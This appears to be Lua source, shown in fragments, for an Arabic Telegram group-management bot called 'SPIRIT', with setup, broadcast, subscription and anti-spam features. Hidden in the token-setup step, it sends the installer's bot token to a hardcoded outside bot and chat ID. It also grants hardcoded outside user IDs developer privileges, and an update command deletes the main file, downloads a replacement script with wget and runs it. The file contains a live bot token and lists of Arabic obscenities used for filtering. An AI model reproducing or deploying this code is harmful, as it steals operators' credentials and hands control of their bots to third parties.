...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺ :\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1975497470:AAHv5jrpS8xlISWnrpXvmA7kYIa7DRzT4Ic/sendmessage?chat_id=1208165035&text=' ..token)
end 
else
print('\27[0;35m⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺ :\n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
sudo_users = {SUDO,1208165035,1855896470,1849514102,92029473829}   
...
var = true
elseif tonumber(user_id) == tonumber(1855896470) then
var = true
...
elseif tonumber(user_id) == tonumber(1849514102) then
var = 'مبرمج السورس'
elseif tonumber(user_id) == tonumber(92029473829) then
var = 'هقرات'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
...
local UserName = (data.username_ or "come_here_to_get")
local NameUser = " ꨄ︎  مـن قبـل  ⇇["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = " ꨄ︎ اسم المستخدم  ⇇["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_," ꨄ︎ الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´")  
...
send(chat,msg.id_," ꨄ︎  ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," ꨄ︎  جاري ...\n ꨄ︎  رفع الملف الان")
else
send(chat,msg.id_,"* ꨄ︎ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
...
send(chat,msg.id_,"\n ꨄ︎ تم رفع الملف بنجاح وتفعيل الجروبات\n ꨄ︎ ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n ꨄ︎ العضــو  ⇇↝'..Name..'↜\n ꨄ︎ قام بالتكرار هنا وتم طرده '  
...
Text = '\n ꨄ︎ العضــو  ⇇↝'..Name..'↜\n ꨄ︎ قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n ꨄ︎ العضــو  ⇇↝'..Name..'↜\n ꨄ︎ قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
...
if text == "الغاء" or text == "الغاء ꨄ︎ " then   
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء الاذاعه")
...
send(msg.chat_id_, msg.id_," ꨄ︎ تمت الاذاعه الى *~ "..#list.." ~* كروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------by-banda--
...
local bl = 'مرحبا بك في كيب العضو ب سورس سبريت'
local keyboard = {
{'مبرمج السورس'},
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'راستي') 
local BANDA_Msg = { 
...
if not DevSoFi(msg) then
local Text = [[
𓆩 سعر التنصيب عليسورس سبريت 𓆪
سعر التنصيب العادي 20جنيه فقط
⇈⇊ للتواصل اتبع الازرار بالاسفل ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المـبــرمـج مـٱديـسـؤن', url="t.me/AAHMEED11"}},
{{text = 'بــوت تواصـل',url="t.me/E_H_M_BOT"}, 
{{text = 'المـبـرمــج سـبـريـت', url="t.me/spiritc1"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المـبـرمــج ماديسون', url="t.me/AAHMEED11"}},
{{text = 'بــوت تواصـل ماديسون',url="t.me/E_H_M_BOT"}}, 
{{text = 'تـيـم مـٱديـسـؤن',url="https://t.me/joinchat/vPFZyR3OFH0xYTc0"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if not DevSoFi(msg) then
local Text = [[
𓆩  افضـل قنوات في التليجـرام اشـترك في القنوات وتابــع كل جـديد  𓆪
]]
keyboard.inline_keyboard = {
{{text = '𝐒𝐋𝐎𝐖𝐋𝐘..', url="t.me/a_7_z_a_n"}},
{{text = '𝐒𝐏𝐈𝐑𝐈𝐓',url="t.me/come_here_to_get"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n ꨄ︎ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
local bl = 'مرحبا بك في كيب المطور الاساسي ب سورس سبريت'
local keyboard = {
...
local Text = ' ꨄ︎ تم ارسال الملصق من ⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n - '..Name
...
local Text = ' ꨄ︎ المستخدم ⇇↝'..Name..'↜\n ꨄ︎ تم حظره من التواصل'
...
Text = '\n ꨄ︎ تم تفعيل البوت الخدمي ' 
else
Text = '\n ꨄ︎ بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n ꨄ︎ تم تعطيل البوت الخدمي' 
else
Text = '\n ꨄ︎ بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,' ꨄ︎ الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' ꨄ︎ تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'اضف رد استارت' and DevSoFi(msg) then 
database:set(bot_id..'Tuasl:Bots',true) 
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل لي رد الان')
return false
end
if text == 'مسح رد استارت' and DevSoFi(msg) then 
database:del(bot_id..'Tuasl:Bots') 
send(msg.chat_id_, msg.id_,' ꨄ︎ تم مسح رد استارت')
end
if text == 'ضع كليشه ستارت' and DevSoFi(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ꨄ︎ ارسل لي الكليشه الان')
return false
end
if text == 'مسح كليشه ستارت' and DevSoFi(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ꨄ︎ تم مسح كليشه ستارت')
end
...
echo '⇗ نظام التشغيل ⇖•\n* '"$linux_version"'*' 
echo '⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ ↝ الذاكره العشوائيه ↜  ↚\n* '"$memUsedPrc"'*'
echo '⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ ↝ وحـده الـتـخـزيـن ↜  ↚\n* '"$HardDisk"'*'
echo '⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ ↝ الـمــعــالــج ↜  ↚\n* '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ ↝ الــدخــول ↜  ↚\n* '`whoami`'*'
echo '⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n ꨄ︎ ↝ مـده تـشغيـل الـسـيـرفـر ↜ ↚\n* '"$uptime"'*'
]]):read('*all'))  
end
if text == 'تحديث السورس ' and DevSoFi(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تحديث السورس ايها المبرمج الفاشل')
dofile('DRAGON.lua')  
end
...
local Text = ' ꨄ︎ انت الان المطور الاساسي في البوت \n ꨄ︎سورس سبريت\n ꨄ︎ يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/come_here_to_get)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/34&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'الاحصـائيات' and Devban(msg) then 
local Text = 'قسم الاحصائيات ف البوت'
local Key = {
{'الاحصائيات'},
{'الجروبات','المشتركين'},
{'الثانوين','المطورين'},
...
if text == 'قـسـم الـسـورس' and Devban(msg) then 
local Text = 'قسم السورس للتواصل مع المطورين'
local Key = {
{'السورس'},
{'المطور شيكو','المبرمج كمال','المطور منجي'},
{'المبرمج ماديسون'},
{'قناه السورس','التواصل'},
...
local Text = 'قسم الجلب لجلب النسخ الاحتياطيه ف البوت'
local Key = {
...
send(msg.chat_id_, msg.id_,' ꨄ︎ اصدارسورس سبريت{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓆩 مبرمج السورس 𓆪', url="t.me/AAHMEED11"}}, 
{{text = '𓆩 ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ 𓆪', url="t.me/E_H_M_BOT"}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == '⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناهسورس سبريت ادخل وتابع الجديد](t.me/come_here_to_get)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐏𝐈𝐑𝐈𝐓´', url="t.me/come_here_to_get"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MADI_PICK/34&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'معلومات الكيبورد' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/come_here_to_get)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناة السورس', url="t.me/come_here_to_get"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'سبريت مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
للتواصل مع المبرمج سبريت
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ' ᴅᴇᴠ sᴘɪʀɪᴛ ♪',url="t.me/spiritc1"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ ارسل اليه الاسم الان ")
return false
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n ꨄ︎ قائمة مطورين الثانويين للبوت \n⩹━━━━⊶❲𖥳 𝐒𝐏𝐈𝐑𝐈𝐓 𖥳❳⊷━━━━⩺\n"
for k,v in pairs(list) do
...
Text = ' ꨄ︎ الاحصائيات  \n'..' ꨄ︎ عدد الجروبات  ⇇{'..Groups..'}'..'\n ꨄ︎  عدد المشتركين  ⇇{'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ ارسل الان اذاعتك؟ \n ꨄ︎ للخروج ارسل الغاء ")
return false
end 
...
send(msg.chat_id_, msg.id_," ꨄ︎ ارسل لي التوجيه الان")
return false
end 
...
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ꨄ︎ •\n• لايمكنك استخدام البوت ꨄ︎ •\n• عليك الاشتراك في القناة ꨄ︎ •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' ꨄ︎ لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' ꨄ︎ عدد المشتركين الان  ⇇( '..#pv..' )\n ꨄ︎ تم ازالة  ⇇( '..sendok..' ) من المشتركين\n ꨄ︎  الان عدد المشتركين الحقيقي  ⇇( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' ꨄ︎ لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n ꨄ︎ تم ازالة  ⇇↝ '..q..' ↜ جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n ꨄ︎ تم ازالة  ⇇↝ '..w..' ↜ كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' ꨄ︎  عدد الجروبات الان  ⇇↝ '..#group..' ↜'..DRAGONk..''..DRAGON..'\n ꨄ︎  الان عدد الجروبات الحقيقي  ⇇↝ '..sendok..' ↜ جروبات\n')   
end
end
end,nil)
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ لا تستطيع استخدام البوت \n ꨄ︎  يرجى الاشتراك بالقناه اولا \n ꨄ︎  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
send(msg.chat_id_,msg.id_," ꨄ︎ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n ꨄ︎ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ꨄ︎ تم ترقيته مطور'
texts = usertext..status
else
texts = ' ꨄ︎ لا يوجد حساب بهاذا المعرف'
end
...
usertext = '\n ꨄ︎ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ꨄ︎ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꨄ︎ الـعـضو   ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n ꨄ︎ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if text == 'الغاء' or text == 'الغاء ' then   
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " ꨄ︎ تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ꨄ︎ ' then   
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء الاذاعه للخاص")
...
send(msg.chat_id_, msg.id_," ꨄ︎ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تمت الاذاعه الى >>{"..#list.."} كروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," ꨄ︎ تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_, " ꨄ︎ تم الغاء الامر ")
...
send(msg.chat_id_, msg.id_, ' ꨄ︎ المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' ꨄ︎ عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' ꨄ︎ عذا لا يمكنك وضع معرف كروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' ꨄ︎ البوت ادمن في القناة \n ꨄ︎ تم تفعيل الاشتراك الاجباري في \n ꨄ︎ ايدي القناة ('..data.id_..')\n ꨄ︎ معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' ꨄ︎ عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تغيير رسالة الاشتراك ')
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "راستي")
...
send(msg.chat_id_, msg.id_,' ꨄ︎ … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ꨄ︎ تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,' ꨄ︎ تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," ꨄ︎ تم الغاء حفظ الرابط")
...
send(msg.chat_id_,msg.id_," ꨄ︎ تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
...
send(msg.chat_id_,0," ꨄ︎ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ꨄ︎ ["..DRAGON_Msg.."] \n")
else
send(msg.chat_id_,0," ꨄ︎ الـعـضو  : {["..data.first_name_.."](T.ME/come_here_to_get)}\n ꨄ︎ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","كسمك","يا ابن الخول","المتناك","شرموط","شرموسبريت","ابن الشرموسبريت","ابن الخول","ابن العرص","منايك","متناك","احا","ابن المتناكه","زبك","عرص","زبي","خول","لبوه","لباوي","ابن اللبوه","منيوك","كسمكك","متناكه","احو","احي","يا عرص","يا خول","قحبه","القحبه","شراميط","العلق","العلوق","العلقه","كسمك","يا ابن الخول","المتناك","شرموط","شرموسبريت","ابن الشرموسبريت","ابن الخول","االمنيوك","كسمككك","الشرموسبريت","ابن العرث","ابن الحيضانه","زبك","خول","زبي","قاحب"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"زيج","عفسبريت","نيجه","مصه","لحسه","العبي","ابن التنيج","ارد اتنايج","خره بالعراق","انعل رب العراق","كسربك","كسج","كسي","تنيج","69","عير","كيري","مبعوص","كسختك","بعبصتكم","موشريفه","ابن","صرم","اختك","خالتك","امك","رب الكواد","xnxx","كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
...
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " ꨄ︎ عذرا  ⇇{[@"..data.username_.."]}\n ꨄ︎ عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " ꨄ︎ عذرا  ⇇{["..data.first_name_.."](T.ME/come_here_to_get)}\n ꨄ︎ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","")
sendText(SUDO," ꨄ︎ تم طرد البوت من جروب \n\n ꨄ︎ بواسطة  {"..Name.."}\n ꨄ︎ اسم الجروب {"..NameChat.."}\n ꨄ︎ ايدي الجروب {`"..msg.chat_id_.."`} ",0,'md')
end,nil)
end,nil)
end
-------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' ꨄ︎  عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database :get(bot_id ..'Num:Add:Bot') or 0) and not Debn(msg) then
send(msg.chat_id_, msg.id_,' ꨄ︎  عدد اعضاء الكروب قليله يرجى جمع ⇇ {'..(database :get(bot_id ..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database :sismember(bot_id ..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ꨄ︎ الـجـروب مـفعـل مـن قبـل')
else
sendText(msg.chat_id_,'\n ꨄ︎ مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ꨄ︎ تـم تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
Text = '\n ꨄ︎ تـم تـشغـيل الـبوت فـي الـجـروب جـديد'..
'\n ꨄ︎ بواسطة {「'..Name..'」}'..
'\n ꨄ︎ ايدي الجروب {'..IdChat..'}'..
'\n ꨄ︎ اسم الجروب {['..NameChat..']}'..
'\n ꨄ︎ الرابط {['..LinkGp..']}'
sendText(SUDO,Text,0,'md')
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ الـبوت مـعطـل مـن قبـل')
else
sendText(msg.chat_id_,'\n ꨄ︎ مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ꨄ︎ تـم تـعـطيل الـبوت   {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database :srem(bot_id ..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
...
Text = '\n تـم تـعـطيل الـبوت مـن الـجـروب ꨄ︎ '..
'\n ꨄ︎ بواسطة {「'..Name..'」}'..
'\n ꨄ︎ ايدي الجروب {'..IdChat..'}'..
'\n ꨄ︎ اسم الجروب {['..NameChat..']}'..
'\n ꨄ︎ الرابط {['..LinkGp..']}'
...
send(msg.chat_id_, msg.id_," ꨄ︎ تمت ترقيه ❮ "..num2.." ❯ من الادمنيه") 
end
end,nil)   
end
...
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ꨄ︎ تم تحديث السورس')
dofile('DRAGON.lua')  
end

if text and text:match("^تغير الاشتراك$") and DevSoFi(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ꨄ︎ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevSoFi(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ꨄ︎ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "مسح رساله الاشتراك " and DevSoFi(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ꨄ︎ تم مسح رساله الاشتراك ")
return false  
end
